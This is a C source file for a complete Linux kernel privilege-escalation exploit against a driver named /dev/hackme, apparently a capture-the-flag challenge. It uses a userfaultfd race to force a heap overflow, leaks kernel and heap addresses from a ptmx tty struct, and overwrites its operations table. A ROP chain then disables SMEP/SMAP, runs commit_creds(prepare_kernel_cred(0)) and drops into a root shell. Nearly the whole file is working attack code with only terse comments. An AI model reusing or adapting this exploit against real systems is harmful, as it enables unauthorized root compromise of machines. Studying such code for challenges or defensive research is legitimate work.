/*************************************************************
 * File Name: exp_ptmx.c
 * 
 * Created on: 2019-11-04 06:04:15
 * Author: raycp
 * 
 * Last Modified: 2019-11-14 07:25:39
 * Description: double fetch with userfaultfd to form heap overflow, rop chain to close smep and ret2usr to privilege escalate.
************************************************************/

#include <stdio.h>
#include <inttypes.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <assert.h>
#include <poll.h>


#define DEV_NAME "/dev/hackme"
#define PTMX_NAME "/dev/ptmx"
#define SEARCH_SIZE 0x200000
#define UID 1000

#define __NR_userfaultfd 323

// function address
typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

_prepare_kernel_cred prepare_kernel_cred = 0x4d3d0;// T prepare_kernel_cred
_commit_creds commit_creds = 0x4d220; // T commit_creds

//gadget offset
#define mov_cr4_rdi_push_p_p_ret_offset  0x00252b  //: mov cr4, rax; push rcx; popfq; pop rbp; ret;
#define prdi_ret_offset  0x033de0  //: pop rdi; ret;
#define prax_ret_offset 0x01b5a1  //: pop rax; ret;
#define swapgs_p_p_ret_offset  0x200c2e  //: swapgs; popfq; pop rbp; ret;
#define iretq_p_ret_offset  0x019356  //: iretq; pop rbp; ret;
#define ret_offset 0x0001cc  //: ret;
#define mov_rsp_rax_ret_offset 0x200F66 //mov rsp, rax ; ret
#define mov_cr4_rax_p_ret_offset 0x00252b //: mov cr4, rax; push rcx; popfq; pop rbp; ret;
#define ptm_unix98_ops_offset 0x625d80
#define call_rdx_offset 0x5DBEF 
#define prcx_ret_offset 0x633ad8 //: pop rcx; ret;
#define mov_rdi_rax_call_rcx_offset 0x4a5a0 //: mov rdi, rax; mov rbp, rsp; call rcx;
#define pop_rsp_ret_offset 0x0484f0 //: pop rsp; ret;


uint64_t mov_cr4_rax_p_ret = 0;
uint64_t prax_ret = 0;
uint64_t prdi_ret = 0;
uint64_t swapgs_p_p_ret = 0;
uint64_t iretq_p_ret = 0;
uint64_t ret = 0;
uint64_t mov_rsp_rax_ret = 0;
uint64_t call_rdx = 0;
uint64_t prcx_ret = 0;
uint64_t mov_rdi_rax_call_rcx = 0;
uint64_t pop_rsp_ret = 0;


static long uffd;
uint64_t fault_page;
uint64_t fault_page_len;

struct user_input
{
    uint32_t idx;
    uint32_t pad;
    char *data_ptr;
    uint64_t size;
    uint64_t offset;
};

void die(const char* msg)
{
    perror(msg);
    _exit(-1);
            
}

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status() {
    asm(
            "movq %%cs, %0\n\t"
            "movq %%ss, %1\n\t"
            "movq %%rsp, %2\n\t"
            "pushfq\n\t"
            "popq %3\n\t"
            : "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags)
            :
            : "memory");

 }
void privilege_escalate()
{
    commit_creds(prepare_kernel_cred(0));
}


void root_shell()
{
    if(!getuid()) {
        system("/bin/sh");
    }
    else {
        die("get root shell failed");
    }
    exit(0);
}


void ko_malloc(int fd, uint32_t idx, char* data_ptr, uint64_t size)
{
    struct user_input input;
    input.idx = idx;
    input.data_ptr = data_ptr;
    input.size = size;

    int ret;

    ret = ioctl(fd, 0x30000, &input);
    if(ret == -1) {
        die("malloc error");
    }
    return ;
}

void ko_read(int fd, uint32_t idx, char* data_ptr, uint64_t size, uint64_t offset)
{

    struct user_input input;
    input.idx = idx;
    input.data_ptr = data_ptr;
    input.size = size;
    input.offset = offset;

    int ret;

    ret = ioctl(fd, 0x30003, &input);
    if(ret == -1) {
        die("read error");
    }
    return ;
}


void ko_write(int fd, uint32_t idx, char* data_ptr, uint64_t size, uint64_t offset)
{

    struct user_input input;
    input.idx = idx;
    input.data_ptr = data_ptr;
    input.size = size;
    input.offset = offset;

    int ret;

    ret = ioctl(fd, 0x30002, &input);
    if(ret == -1) {
        die("write error");
    }
}

void ko_free(int fd, uint32_t idx )
{

    struct user_input input;
    input.idx = idx;

    int ret;

    ret = ioctl(fd, 0x30001, &input);
    if(ret == -1) {
        die("free error");
    }
}

static void *
fault_handler_thread(void *arg)
{
   static struct uffd_msg msg;   /* Data read from userfaultfd */
   long uffd;                    /* userfaultfd file descriptor */
   //struct uffdio_copy uffdio_copy;
   ssize_t nread;

   uffd = (long) arg;

    /* See what poll() tells us about the userfaultfd */
    struct pollfd pollfd;
    int nready;
    pollfd.fd = uffd;
    pollfd.events = POLLIN;
    nready = poll(&pollfd, 1, -1);
    if (nready == -1)
           die("poll");

    /* Read an event from the userfaultfd */
    nread = read(uffd, &msg, sizeof(msg));
    if (nread == 0) {
           printf("EOF on userfaultfd!\n");
           exit(EXIT_FAILURE);
    }
    if (nread == -1)
           die("read");

    /* We expect only one kind of event; verify that assumption */
    assert(msg.event == UFFD_EVENT_PAGEFAULT);
    
    // sleep to wait for root shell
    printf("[+] fault page handler finished, vuln formed, hacking the world now...\n");
    sleep(1000);

}

void register_userfault()
{

   long uffd;          /* userfaultfd file descriptor */
   struct uffdio_api uffdio_api;
   struct uffdio_register uffdio_register;
   pthread_t thr;      /* ID of thread that handles page faults */
   int s;

   /* Create and enable userfaultfd object */
   uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
   if (uffd == -1)
           die("userfaultfd");

   uffdio_api.api = UFFD_API;
   uffdio_api.features = 0;
   if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
           die("ioctl-UFFDIO_API");

   /* Register the memory range of the mapping we just created for
          handling by the userfaultfd object. In mode, we request to track
          missing pages (i.e., pages that have not yet been faulted in). */
   uffdio_register.range.start = fault_page;
   uffdio_register.range.len = fault_page_len;
   uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
   if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
           die("ioctl-UFFDIO_REGISTER");

   /* Create a thread that will process the userfaultfd events */
   s = pthread_create(&thr, NULL, fault_handler_thread, (void *) uffd);
   if (s != 0) {
       die("pthread_create");
   }
}

int main()
{
    int fd, ptmx_fd, i, j;
    uint64_t size, offset, kernel_base, kheap_addr, ptmx_offset=0;
    uint32_t idx;
    char *data_ptr;
    uint64_t evil_buff[0x200/8];

    fd = open(DEV_NAME, O_RDONLY);
    if(fd==-1) {
        die("open dev error");
    }

    // create a chunk with big size first and then delete the chunk, leave a null pointer with size remained
    data_ptr = (char*)malloc(SEARCH_SIZE);
    size = SEARCH_SIZE;
    idx = 0;
    ko_malloc(fd, idx, data_ptr, size);

    idx = 0;
    ko_free(fd, idx);

    if(fork() ==0) {
        // in child process, trigger the page fault and stay in the loop, forms the vuln (big size, small buf).
        data_ptr = (char*)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        fault_page = (uint64_t)data_ptr;
        fault_page_len = 0x1000;
        register_userfault();
        
        idx = 0;
        size = 0x2e0;  // the size should be the same with ptmx struct(need to be the same slub)
        ko_malloc(fd, idx, data_ptr, size); // stucked in copy_from_user
    
    }

    sleep(2); // wait child process to form the vuln
    // malloc a ptmx struct
    ptmx_fd = open(PTMX_NAME, O_RDWR);
    if(ptmx_fd == -1 )
        die("open ptmx error");

    // trying to find ptmx struct
    printf("trying to find ptmx struct\n");
    for( i=0; i<SEARCH_SIZE; i+=0x200 ){
        printf("0x%x\n", i);
        size = 0x200;
        idx = 0;
        offset = i;
        ko_read(fd, idx, (char*)evil_buff, size, offset);
        for(j=0; j<0x200/8; j++){
            if(evil_buff[j] == 0x0000000100005401){
                ptmx_offset = i+j*8;
                printf("find ptmx struct at offset: 0x%lx\n", ptmx_offset);
				break;
            }
        }
        if(ptmx_offset != 0)
            break;
    }
    if(ptmx_offset==0)
        die("can't find ptmx struct");
   
    // leak kernel base and heap address
    kernel_base = evil_buff[3] - ptm_unix98_ops_offset;
    kheap_addr = evil_buff[7] - 0x38 - ptmx_offset;
    printf("leak kernel base: 0x%lx\n", kernel_base);
    printf("leak kheap address: 0x%lx\n", kheap_addr);

    // get the gadget address
    prdi_ret = kernel_base + prdi_ret_offset;
    prax_ret = kernel_base + prax_ret_offset;
    mov_rsp_rax_ret = kernel_base + mov_rsp_rax_ret_offset;
    swapgs_p_p_ret = kernel_base + swapgs_p_p_ret_offset;
    mov_cr4_rax_p_ret = kernel_base + mov_cr4_rax_p_ret_offset;
    call_rdx = kernel_base + call_rdx_offset;
    ret = kernel_base + ret_offset;
    prcx_ret = kernel_base + prcx_ret_offset;
    mov_rdi_rax_call_rcx = kernel_base + mov_rdi_rax_call_rcx_offset;
    commit_creds += kernel_base;
    prepare_kernel_cred += kernel_base;
    pop_rsp_ret = kernel_base + pop_rsp_ret_offset;
    iretq_p_ret = kernel_base + iretq_p_ret_offset;

    // save status
    save_status();


    // fake tty operation
	uint64_t fake_tty_operations[40];

    // this is close pointer, which is the first gadget
    fake_tty_operations[4]=call_rdx; // mov     rax, [rbx+38h]; mov     rdx, [rax+0C8h]; call rdx;

    // this is the second gadget
    fake_tty_operations[0xc8/8] = mov_rsp_rax_ret;
    
    // now the rop chain
    fake_tty_operations[0] = pop_rsp_ret;
    fake_tty_operations[1] = kheap_addr + 0x10;
    fake_tty_operations[2] = ret;
    fake_tty_operations[3] = prdi_ret;  // skip the fake_tty_operations[4]
    fake_tty_operations[5] = prax_ret; 
    fake_tty_operations[6] = 0x6f0;
    fake_tty_operations[7] = mov_cr4_rax_p_ret; // close smep and smap
    fake_tty_operations[8] = 0;
    fake_tty_operations[9] = (uint64_t) privilege_escalate;
    fake_tty_operations[10] = swapgs_p_p_ret;
    fake_tty_operations[11] = 0;
    fake_tty_operations[12] = 0;
    fake_tty_operations[13] = iretq_p_ret;
    fake_tty_operations[14] = (uint64_t)root_shell;
    fake_tty_operations[15] = user_cs;
    fake_tty_operations[16] = user_rflags;
    fake_tty_operations[17] = user_sp;
    fake_tty_operations[18] = user_ss;

    // here is rop chain to privilege_escalate
    /* 
    fake_tty_operations[0] = prax_ret;
    fake_tty_operations[1] = 0x6f0;
    fake_tty_operations[2] = ret;
    fake_tty_operations[3] = prdi_ret;
    fake_tty_operations[5] = mov_cr4_rax_p_ret;
    fake_tty_operations[6] = 0;
    fake_tty_operations[7] = prdi_ret;
    fake_tty_operations[8] = 0;
    fake_tty_operations[9] = prepare_kernel_cred;
    fake_tty_operations[10] = prcx_ret;
    fake_tty_operations[11] = prax_ret;
    fake_tty_operations[12] = mov_rdi_rax_call_rcx;
    fake_tty_operations[13] =commit_creds;
    fake_tty_operations[14] = swapgs_p_p_ret;
    fake_tty_operations[15] = 0;
    fake_tty_operations[16] = 0;
    fake_tty_operations[17] = iretq_p_ret;
    fake_tty_operations[18] = (uint64_t)root_shell;
    fake_tty_operations[19] = user_cs;
    fake_tty_operations[20] = user_rflags;
    fake_tty_operations[21] = user_sp;
    fake_tty_operations[22] = user_ss;
    */

    // fake ptmx struct
    uint64_t *fake_tty_struct;
    fake_tty_struct = evil_buff;
    fake_tty_struct[3] = (uint64_t)kheap_addr;  // overwrite to form the fake_tty_operations
    fake_tty_struct[0x38/8] = kheap_addr;  // this is  'mov rax, [rbx+38h]' address
    
    // deploy rop chain
    size = sizeof(fake_tty_operations);
    idx = 0;
    offset = 0;
    ko_write(fd, idx, (char*)fake_tty_operations, size, offset);

    // overwrite the fake ptmx back
    size = sizeof(evil_buff);
    idx = 0;
    offset =  ptmx_offset;
    ko_write(fd, idx, (char*)fake_tty_struct, size, offset);

    // trigger close pointer to execute rop chain.
    close(ptmx_fd);
    
    return 0;
}
